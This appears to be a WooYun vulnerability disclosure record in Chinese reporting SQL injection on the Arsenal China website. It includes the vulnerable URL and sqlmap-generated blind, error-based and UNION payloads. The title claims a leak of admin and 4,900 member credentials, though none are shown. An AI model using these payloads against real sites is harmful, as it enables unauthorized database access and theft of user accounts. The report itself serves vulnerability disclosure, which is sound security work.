wybug_title: 阿森纳中国官网主站多个页面存在SQL注入漏洞+泄露后台账号密码+泄露4900会员账号密码
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2015-11-10：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-12-25：	厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  阿森纳中国：cn.arsenal.com测试URL：http://cn.arsenal.com/player.php?id=4
Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=4 and 1=1 AND 3156=3156    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: id=4 and 1=1 AND (SELECT 4083 FROM(SELECT COUNT(*),CONCAT(0x716a7a7071,(SELECT (ELT(4083=4083,1))),0x7178767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: UNION query    Title: Generic UNION query (NULL) - 15 columns    Payload: id=-8879 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716a7a7071,0x61506356625642634b767a62537052416b6f54654d73727866766d6342724a484d424270644d4548,0x7178767a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ----web application technology: PHP 5.6.10back-end DBMS: MySQL 5.0current user is DBA:    False
   漏洞证明：

wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
